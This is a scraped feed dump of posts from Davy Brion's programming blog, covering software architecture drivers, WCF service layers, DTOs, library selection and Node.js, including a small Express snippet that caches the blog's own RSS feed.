2012, my biggest priority is pacing myself much better and spreading things out more. I always seem to alternate between months where I'm always working on something, followed by months of doing as little as possible outside of the 40 hours a week I do for my client. Hopefully, I can finally find a maintainable balance between those two extremes in 2012 <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>On the blogging front, 2011 was a different year than the previous ones on this blog. In the previous years, I averaged about 150 posts a year but this year I only published 71 posts. And I'm actually happy about that. In fact, I hope to get that number down to 50 next year. I still like writing posts, but I no longer feel the need to like I did in the past while I was trying to build a bit of an audience. That often meant pushing myself to keep publishing new posts. Nowadays, I'll only write a post if I really feel like it, which in the long run is much more sustainable anyway. As far as topics covered this year, things have changed quite a bit as well. Some of my views, opinions and technical preferences have changed this year, which naturally reflects in the content I've published. I'm sure I've lost some readers this year because of it, but I also seem to have gained a lot more readers than I've lost. I don't know yet what I'll be writing about in 2012, but I will continue to push people to learn new things (or old things that people seem to forget about) and do better like I always have on this blog, in my own unique way of course <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>I hope you all enjoyed Christmas, and I wish you all a happy 2012.

{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/yuIOGHkNr8w/","title":"Architectural Drivers","published":{"$wrap":"$date","v":1330276250000,"h":"2012-02-26T17:10:50.000Z"},"starred":false,"read":false,"content":"<p>There are many different opinions and preferences when it comes to how we should deal with software architecture. My personal preference is to try not to make things more complex than they should be, while striving to maintain enough flexibility to be able to deal with future changes in both functional and non-functional requirements in a way that hopefully doesn't require extensive effort. I've always thought of good architecture essentially being something that enables developers to keep implementing new features over time at a similar cost than what it took to implement features in the early stages of development. Thus I prefer to try to find a balance between simplicity of the codebase, and making sure that the architecture scales nicely (from a code quality point of view) as the application grows in functionality. I also like to make sure that we can scale out (from a performance/throughput point of view) relatively easily if that need to scale comes up. These are just my general preferences though, and aren't always relevant to every project or suitable for every situation. I'm now in the 10th year of my career and have seen a variety of architectural styles in the wild, and of course I've read and heard about many more since the subject has always interested me a lot. I've learned that it's important to keep <em>architectural drivers</em> of a project in mind when thinking about what kind of architecture is suitable for a certain project or situation. Those drivers are often more important than whatever your personal preferences are. I've come up with a list of drivers that I think should influence the architecture used by teams or organizations.</p><h3>Simplicity/Complexity of the application</h3><p>A common mistake is to decide to use a fashionable architectural style in a project that doesn't really have enough complexity to warrant the use of said architectural style. For instance, there's no reason whatsoever to go the DDD route if your application is mostly a forms-over-data CRUD app. You won't really get any benefit from it, and you'll only increase the total cost of the required development effort. On the other hand, an application which will feature a lot of <em>behavior</em> in a complex domain will certainly benefit from using a DDD approach versus a data-driven approach that implements the behavior in a more procedural, transaction-script based approach. Be honest to your customer/employer and <em>yourself</em> and make an objective decision based on the simplicity or the complexity of the required solution that you're being paid to build. Don't let enthusiasm for a fashionable architectural style influence your decision.</p><h3>Expected lifetime of the application</h3><p>Some applications live for years and years, and some are only temporary solutions that will be phased out a year or two after having been put in production. Of course, some of those temporary solutions end up being used much longer than what was originally expected due to a variety of reasons but that certainly isn't always a given. Unless you're familiar enough with how things typically go at your client or your company to predict these things, your best bet is to just go with the initially expected lifetime of the application. Does a temporary solution require the best possible architecture out there, and the resulting impact that would have on the cost to build it? I'd say it most often doesn't. In these cases, there's nothing wrong with going for the approach that is simply good enough for what is required. Striving for perfection is expensive, and generally not worth it for short-term solutions. Conversely, if the solution is expected to last a long time, a solid architecture becomes more important and is worth the extra investment to (try to) get it right if that makes it possible to keep the costs of long-term development under control.</p><h3>Strategic importance of the application</h3><p>Some applications are meant to improve the <em>core business</em> of a company, while others play a more supportive role in something that isn't actually part of the company's core business. Some applications generate revenue (directly or by improving efficiency of revenue-generating activities) while others are meant to reduce costs, typically administrative in nature. Cost reduction is important, but it's not quite as important as revenue generation and that's a factor that should be taken under consideration. A strategically important application almost always warrants putting in the effort to come up with a good architecture because it's highly likely that the application will have to evolve in whichever direction the business evolves. That's not to say that the same kind of effort wouldn't be important for cost-reducing applications. But it just might be less important than you'd like to think it is. Again, good architecture increases the cost of the project, and the return on that investment in the big picture of the company should not be ignored.</p><h3>Skill-level/discipline of team</h3><p>Good code and good architecture requires skill and discipline. A strong team is capable of letting good architecture grow organically and keep it at a high quality level. For a mediocre team, letting it grow organically is too often a recipe for disaster. Ideally, we'd always be working with strong teams but as we all know, that simply isn't always possible. For mediocre teams, it often makes sense to put architecture in place that is more restrictive in nature and where everyone knows how the code should be structured in advance. The downside is that this typically reduces flexibility and individual creativity, and often introduces more ceremony and indirection than what many of us would ideally like to see. But it's likely that those downsides are offset by having everyone on the same page and taking some possibly difficult decisions away from people who might not be strong enough to make the right decisions. I know that sounds harsh, but that's a reality that many of us have to deal with.</p><h3>Conformity/Continuity</h3><p>A lot of IT departments or software development companies prefer to use the same architecture and frameworks/libraries for most (or even all) of their projects because it makes it easier to have people work on multiple projects. In this situation, it's easier to move people between projects or have them do maintenance work on a project they weren't initially involved in. While this often prevents going with the most suitable approach for every project, it does introduce a few benefits that are hard to argue with. People will need less time to get familiar with a code base. In-house training and sharing of knowledge get easier. Bringing in new people (especially for temporary assignments) also gets somewhat easier because you have a baseline of required skills/knowledge that should go a long way within the organization. A huge downside however, is that it creates an environment that will quickly frustrate creative developers. Also, when new strong developers are brought in, they could quickly tune out once they realize they got there too 'late' to have any influence on how projects are developed. The interesting part about this driver is that it is influenced by the skill-level-discipline driver, while simultaneously influencing it towards the future.</p><h3>Non-functional requirements</h3><p>This is the last driver on the list, but it is certainly not the least important. Obviously, architecture is greatly influenced by some important non-functional requirements. There are many factors that can have a profound influence on what the most suitable architecture of a system could be, and it's important to think about those as quickly as possible. Do you need to respond in real time? Do you need to support mobile devices? Will there be connectivity issues? Will you need to scale massively? What are the auditing requirements? Are you dependent on third-party services? Do you need to minimize resource consumption? What kind of accessibility do you have to keep into account? The list goes on and on and many of these issues can end up becoming huge problems if you don't think about them ahead of time. Of course, you can't think of everything in advance, and many non-functional requirements can be introduced during the lifetime of the application instead of being known in advance. But the more you know in advance, the better you can prepare your software for them from the beginning.</p><h3>Conclusion</h3><p>There is a virtually endless variety of architectural choices and styles that can influence how you develop software. And unfortunately, there's a lot of dogma surrounding it as well. I hope this post made it clear that there is no definitive 'right' or 'wrong' when it comes to architecture, and that (as pretty much everything else in this business) it all really depends <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>I'm sure you can think of more architectural drivers, and I'd love to hear about any that you think I've forgotten.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/yuIOGHkNr8w\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1103}}

I used to be a fan of this approach as well, but these days I just don't see the benefit of that internal service layer anymore. The overhead that an internal WCF service layer adds to development, deployment and runtime performance just doesn't stack up favorably to the supposed benefits IMO. To be clear: I'm talking about WCF services that will <em>only</em> be used by the front end of your web application.</p><p>Let's talk about the overhead on development first. If you're using WCF services in your web app, you need proxies to access those services. Some people prefer to generate the proxies based on the WSDL of the services that will be used. In the worst case, this leads to regenerating proxies and all of the types that are defined in the WSDL every time you change a service contract or one of the types that are used by the services. If multiple people need to make changes to any of these concurrently, this easily leads to merging problems when people need to commit their changes. Another way is to share the same types on both sides (client & server), and implement your service proxies by inheriting from ClientBase and manually keeping the implementation of the proxies up to date with the definitions of their service contracts. This is better than regenerating a bunch of code all the time, but you're still writing a lot of redirection code for the purpose of, well, what exactly? Another possibility is to use dynamic proxies which automatically implement the service contracts but this increases the amount of infrastructure code you need to put in place and it's not always clear to everyone how exactly communication with the services happens. There's also a lot of WCF configuration for each service that you need to maintain, and it can quickly grow unwieldy.</p><p>Then there's the overhead on performance. I hope we can all agree that any operation that goes out of process is at least an order of magnitude slower than a similar operation that can be executed in process. First of all, there's the networking overhead (even if your services are hosted on the same machine as the web app) that you have to keep into account. Secondly, there is the cost of serializing and deserializing <em>everything</em> that is transferred between the client and the server. Even with the most efficient bindings and serializers, the cost of all of this quickly adds up on high-traffic web apps. That's not to say that WCF services are inherently slow. They can be very fast and efficient, but they'll never be as fast and efficient as executing that logic in process within the web app.</p><p>Finally, there's the extra overhead it introduces to the deployment phase:</p><ul><li>more endpoints to set up and transfer artifacts to</li><li>more configuration</li><li>more monitoring of endpoints</li><li>more servers if you're not hosting the services and the web app on the same machine</li></ul><p>Of course, people will argue that there a plenty of benefits to using a WCF service layer in a web app. The ones I hear about most often are the forced separation of business logic and UI logic and improved scalability and reliability. I really disagree that you need a physical separation of business and UI logic. I much prefer approaches where the separation is based on abstractions. A good example was recently posted by Ayende (<ahref=\"http://ayende.com/blog/154241/limit-your-abstractions-the-key-is-in-the-infrastructurehellip\">here</a> and <ahref=\"http://ayende.com/blog/154273/limit-your-abstractions-and-how-do-you-handle-testing\">here</a>). And when it comes to scalability/reliability, a web app that isn't dependent on a WCF service layer is as easy (or even easier depending on your setup) to scale than one that is entirely dependent on WCF services. First of all, if you care about scalability/reliability your web app should already be prepared to run behind a load balancer. If you already have a load balancer in place, you can just add more web servers to your setup when needed. If you'd host the WCF services on the same machines that are hosting the web front end, you'd get less total throughput from one server than you would if that one server could just host a web app that fully executes in process (not including the database obviously). If you're hosting the WCF services on separate machines, you'd end up with more servers to handle the load and to achieve the reliability you need than you would with just being able to add more web servers to your setup. That also increases your licensing costs. And of course, it also means increased networking overhead on every service call, which also implies that the threads on your web servers will be blocked for longer periods while they wait for those service calls to return. Unless you're calling those services asynchronously, but most people simply don't. Also, if you have serious scalability and reliability requirements you're probably better off with asynchronous messaging solutions than with SOAP services.</p><p>WCF has its benefits (though I prefer Web API's or asynchronous messaging over SOAP services these days) and it has its use cases. I just don't think internal service layers for web apps is one of them.</p><p>What are the benefits that you think an internal WCF service layer brings to your web app? And what's your opinion on how they stack up versus the downsides?</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/p7TClTj7aaA\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1104}}

It is extremely fast, doesn't delay any requests, and doesn't require me to deploy anything but the company website. I'm building the site with <ahref=\"http://expressjs.com/\">Express</a> on <ahref=\"http://nodejs.org/\">Node.js</a>, which means I can take full advantage of the asynchronous nature of Node.js to implement this.</p><p>Let's go over the code... in the script that starts the express server, I have the following code:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var express = require('express'),app = module.exports = express.createServer(),NodePie = require('nodepie'),request = require('request'),recentFeedItems = null;app.dynamicHelpers({getRecentFeedItems: function() {return recentFeedItems;}});// ... some extra configuration of Express that isn't relevant to this postvar processFeed = function(callback) {request('http://feeds.feedburner.com/davybrion', function(err, response, body) {if (!err && response.statusCode == 200) {var feed = new NodePie(body);feed.init();recentFeedItems = feed.getItems(0, 5);if (callback) callback();};});};setInterval(processFeed, 1800000); // process feed items every 30 minutesprocessFeed(function() {app.listen(3000);console.log('Express started on port 3000');});</pre></div><p>I'll discuss the code in just a moment, but first I want to show the view code that renders the links:</p><div><pre class=\"brush: xml; title: ; notranslate\">&lt;ul&gt;&lt;% getRecentFeedItems.forEach(function(item) { %&gt;&lt;li&gt;&lt;time class=\"date\"&gt;&lt;%= item.getDate().getDate() + '/' + (item.getDate().getMonth() + 1) %&gt;&lt;/time&gt;&lt;a href=\"&lt;%= item.getPermalink() %&gt;\"&gt;&lt;%= item.getTitle() %&gt;&lt;/a&gt;&lt;/li&gt;&lt;% }); %&gt;&lt;/ul&gt;</pre></div><p>And that's all. This is the solution in its entirety!</p><p>If you're new to Node, this code probably requires some explanation. Let's start with this part:</p><div><pre class=\"brush: jscript; title: ; notranslate\">app.dynamicHelpers({getRecentFeedItems: function() {return recentFeedItems;}});</pre></div><p>Here I'm adding a dynamic helper to the Express application. It basically means that my views have access to the getRecentFeedItems function, which returns the value of the recentFeedItems variable. It's important to know that the getRecentFeedItems function creates a closure on the recentFeedItems variable created above it. That means that if the value of the recentFeedItems variable changes at any point in time, the getRecentFeedItems function will return that new value.</p><div><pre class=\"brush: jscript; title: ; notranslate\">var processFeed = function(callback) {request('http://feeds.feedburner.com/davybrion', function(err, response, body) {if (!err && response.statusCode == 200) {var feed = new NodePie(body);feed.init();recentFeedItems = feed.getItems(0, 5);if (callback) callback();};});};</pre></div><p>This just creates a function that we can use later on. It retrieves the feed asynchronously, and when the result is retrieved, we parse the feed using the NodePie library and we get the 5 most recent items which we store in the recentFeedItems variable. Again, this creates a closure on the recentFeedItems variable which means that every time we assign a value to this variable, any subsequent call to the getRecentFeedItems function will return the value we just assigned to it because both functions point to the same memory thanks to the magic of closures. Finally, if a callback is provided as a parameter, the callback will be invoked.</p><div><pre class=\"brush: jscript; title: ; notranslate\">setInterval(processFeed, 1800000); // process feed items every 30 minutesprocessFeed(function() {app.listen(3000);console.log('Express started on port 3000');});</pre></div><p>The call to setInterval makes sure that the processFeed function is called every 30 minutes. After that, we call the processFeed function manually, and we pass in a callback where we start the Express server. This guarantees that the feed items will be in memory before the server starts processing requests.</p><p>What makes this solution so great is that we take full advantage of some of Node's benefits. Whenever we retrieve the RSS feed, Node.JS will retrieve that data asynchronously. As soon as it has fired the request to get the RSS feed, it just goes to the next event in its eventloop so no request is kept waiting while we wait for the data to be downloaded. Until the data from the RSS feed is returned, each request will just use the items that are stored in the recentFeedItems variable. Once the data has been returned, our callback is executed which overwrites the value of the recentFeedItems variable. We don't need to do any locking here because the Node.JS eventloop is single-threaded: while our callback is running, no other code that has access to the recentFeedItems variable can be executed anyway. And the actual parsing of the RSS feed is done by NodePie, which uses <ahref=\"http://expat.sourceforge.net/\">expat</a> behind the scenes, which is supposedly the fastest C XML parser available.</p><p>Looking back on my initial requirements, I think this solution matches very well.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/YOg6tZlA7JI\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1106}}

Now, despite it being just a breakable toy, I want to do it with as few constraints on technical quality as possible because I want to maximize the learning experience I'm going to get from it. That means I don't just want to quickly put something together that just works. I want something that works, but that would also hold up in real world scenarios, even though the project will at best only be used by myself. Which means that I'm going to be picky about any libraries that I take a dependency on, just as I would if this were a project that I'd be getting paid to work on.</p><p>So as I was browsing through a few possible alternatives for my authentication needs, I started thinking about my thought process when evaluating libraries/frameworks to use. I generally base my decision on the following items, listed in order of importance (to me):</p><ul><li><strong>How well does it work for my scenario?</strong> If a library satisfies all other items on this list, that certainly doesn't mean it's an automatic lock. How it works and the impact it has on my code is definitely the most important factor.</li><li><strong>Popularity</strong>. I've noticed that I let the number of watchers/forks on sites like Github influence my opinion. If a project has many watchers and many forks, odds are high that there's a relatively large group of happy users as well as people involved with the project. It also increases the odds that the project will be around for a while. Of course, inactive Open Source projects often remain available as well but if nobody's working on it, I'm not exactly tempted to take a dependency on it. Log4net is a notable exception to this, obviously. But when a project has a lot of people interested in it, or better yet, contributing to it, it's a good sign that you'll easily get help if needed, it's only going to get better in the long run and that it might get forked should the original developers stop working on it. As the author of an Open Source project that doesn't have a lot of watchers/forks (<ahref=\"https://github.com/davybrion/Agatha\">Agatha</a>), I'm aware that my point of view on this is rather hypocritical but hey, it is what it is.</li><li><strong>Code quality</strong>. I don't have the time to do an in-depth review of the code as I'm sure most of us don't do either. But I do like to glance over the code to get a general feel of the quality of the code. I focus mostly on the clarity of the code and also keep an eye open for sloppiness or downright WTF's. I guess the questions I'm mostly trying to answer when doing this are: \"is this code I'd like to try to improve or fix if I need to?\" and \"how easy would it be to debug this when I need to troubleshoot some non-obvious issues?\".</li><li><strong>Location of code and issue tracker</strong>. A lot of people will probably take issue with this, but I consider it to be a major plus if the project is on Github. Not just because of my personal preference of Github, but because they truly encourage people to collaborate and contribute to projects and they make it very easy to do so. Also, the site is fast! I cringe when I have to look over issues of projects on Codeplex because it's just terribly slow. And the UI doesn't come close to that of Github either. I've heard that Bitbucket is pretty similar to Github, but I've never even looked for projects there. In any case: I want to be able to download the <em>latest</em> version of the code at any time, or of a particular branch if I need to, as easily as possible. I also prefer an issue tracker which is fast, responsive and easy to search. It doesn't have to be Github, but those 2 requirements are important to me.</li><li><strong>License</strong>. If it's GPL, I don't use it. Also, I check whether or not a commercial license needs to be purchased when you want to use the library/framework in production. Pay attention to dual-licensed projects because that Open Source license might not apply to commercial/production use!</li></ul><p>I'd love to hear your thoughts on this.

I've been a fan of DTO's for a long time, but I'm not a fan of how I frequently see them being used. More specifically, I very much dislike the all-too-common approach of creating a DTO for each entity in your domain model. In the worst cases, the DTO's actually reference each other and try too hard to mimic the structure of the entities. For example, an OrderDto which has a reference to a CustomerDto and a collection of OrderLineDto instances. In those cases, I absolutely agree that all of the mapping involved introduces way too much ceremony to the codebase without really offering any concrete benefits.</p><p>Of course, it really depends on the architecture of your system.  If you're using services that are only used by the front-end of your system, then I'd still advise against making those entities available outside of the service boundary for reasons that I've discussed <ahref=\"http://davybrion.com/blog/2010/05/why-you-shouldnt-expose-your-entities-through-your-services/\">earlier</a>. That doesn't mean that you should go the entity-mimicking-DTO-route though. In fact, entity-mimicking-DTO's introduce a few of the same downsides you'd get from exposing entities directly through  your services. For an 'internal' service (i.e. only used by <em>your</em> application), I think it makes a lot more sense to use DTO's per service operation which are optimized for the use case that that service operation is meant to implement.</p><p>Essentially, an internal service's operations will be either <em>queries</em> or <em>commands</em>. When it comes to queries, why not just do the simplest thing possible? In most cases, it's sufficient to just return the data in the exact same form that the data will be displayed in. Quite often, that means a denormalized set of data where the data comes from more than one type of entity/table. There's no reason to send a bunch of entity-mimicking DTO's that reference each other to the client if you're going to use the data to populate a grid. Just send a list of DTO's which are already in the most optimal form. Populating those DTO's can then simply be done through straight SQL, a view, a stored procedure, a <ahref=\"http://davybrion.com/blog/2010/09/think-twice-before-you-map-entities-to-dtos/\">projection through your ORM</a>, a map/reduce operation, or whatever else that makes sense. The point is that in most cases, you should just <em>populate</em> those DTO's as directly as you can instead of <em>mapping</em> to those DTO's. In this case, the DTO's offer a clear-cut benefit and don't really introduce tedious ceremony code in your codebase.</p><p>As for the commands (inserts, updates, anything that <em>creates</em> something or results in something <em>happening</em>), why even use DTO's in the first place? People will often argue that the ability to reuse the entity-mimicking-DTO's for these operations is a benefit. Personally, I don't really see the benefit. The mere presence of entity-mimicking-DTO's only encourages people to use them for the queries as well. Instead, I prefer to go with types that encapsulate all of the data relevant to the current command (the data to be inserted/updated, or whatever else the command needs). In a very simple scenario, this could be an InsertCustomerCommand type which simply has properties for the data that needs to be inserted. Nobody will be confusing these types with any other purpose than what their name communicates.</p><p>If you're building a web app where the server-side code does everything in process (i.e. without a WCF service), then you can in many cases just use the entities directly without a real drawback, though I'd recommend keeping an eye on unexpected select N+1 problems, since those will frequently come up when you're preparing your views. But even in this case, using DTO's that are optimized for the scenarios in which they're being used can really simplify the query-side of your system a lot.</p><p>There's nothing inherently wrong with DTO's if you use them to simply transfer <em>data</em>. If you're using them to transfer entities, you're robbing yourself of their biggest benefit while only making things more complex than they need to be.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/wDCy16gD6Uc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1108}}

In this post, I'll try to give an easy-to-understand overview of what makes Node.js different and make it clear that it's more than just server-side JavaScript. Note that this overview is highly simplified and only meant to help people understand how Node.js works. This is definitely not a completely accurate description of the lower-level details of Node.js.</p><h2>Evented/Asynchronous I/O</h2><p>In most technology stacks, API calls for I/O operations are synchronous. As in, the thread that executes the operation is blocked for the duration of the I/O operation until that operation has completed. Once completed, execution of your code proceeds. Of course, a lot of technology stacks have asynchronous variants of those operations available as well, but generally speaking, they aren't used as often as the synchronous variants. In Node.js, it's the other way around. All I/O operations are asynchronous and there are only a few synchronous implementations available (and you're generally discouraged from using them).</p><p>This means that whenever you do an I/O operation (file manipulation, network requests, database operations, etc…), Node.js initiates the I/O operation through a lower-level C/C++ layer which will perform the operation asynchronously. Once the operation has completed, Node.js will execute your callback function that you passed as a parameter to the I/O operation's function call. The important thing here is that while the I/O operation is being executed, Node.js doesn't have to wait for the operation to complete, and is able to focus entirely on processing other events. And those events can be anything: incoming network requests, executing callbacks from other operations that have completed, or invoking whatever function that is assigned to a particular event.</p><h2>Eventloop</h2><p>The Node.js eventloop is what makes Node.js so interesting and powerful. Node.js basically just keeps reading from an event queue until that queue is empty. As it loops through the events to be processed, it invokes the JavaScript functions that have been assigned for those events. If any of those functions performs an I/O operation, Node.js will initiate the operation and then immediately move to the next event in the event queue. Once the I/O operation has completed, an event will be added to the event queue with a reference to your original callback. Once all preceding events have been processed, Node.js will get to the newly added event and invoke your callback. Because all I/O operations are asynchronous, this enables Node.js to maximize its efficiency as it processes events because it doesn't need to wait for slow I/O operations to complete.</p><h2>Single-threaded</h2><p>One thing that people don't always realize is that the Node.js eventloop is single-threaded. This has some nice benefits but there's a huge drawback as well. The biggest benefit is that you don't need to worry about concurrent access to shared state. After all, there is never more than 1 thread executing your JavaScript functions. This means you don't have to write any locking code to protect shared state. The drawback to the single-threaded eventloop is that you need to be careful not to block the event loop. If you're planning on doing heavy synchronous processing in your JavaScript code, you need to realize that no other events can be processed by Node.js until that synchronous block of code has completed. Obviously, since there's only one thread going through the eventloop, any delay you cause in your code can be very costly to overall throughput and performance. For now, it's best to execute synchronous processing routines as a child process, possibly even in a language that is more suitable for this than JavaScript. But it seems that future Node.js versions will provide a more integrated way to deal with this.</p><h2>Why JavaScript?</h2><p>JavaScript's support of closures and it treating functions as first class objects means it's ideally suited for the evented programming model that Node.js offers. Many people still think of JavaScript as a joke or a toy language, but it's a lot more powerful than many people think it is. Yes, it certainly has problems as well, but it's definitely worth learning. I do hope that this post has made it clear that there's a lot more to Node.js than simply being server-side JavaScript. What makes Node.js so interesting are the principles that I've tried to explain in this post. Those principles can be implemented with other languages as well, and could be made to work just as great as, or perhaps even greater than Node.js itself. But you'd be hard-pressed to find a language that's so ubiquitous, yet completely devoid of a pre-existing synchronous I/O infrastructure.</p><p>Anyways, I hope I succeeded at making it somewhat clear how Node.js works and why it's so different from most other technology stacks.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/AsPaZvBN6HA\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1110}}

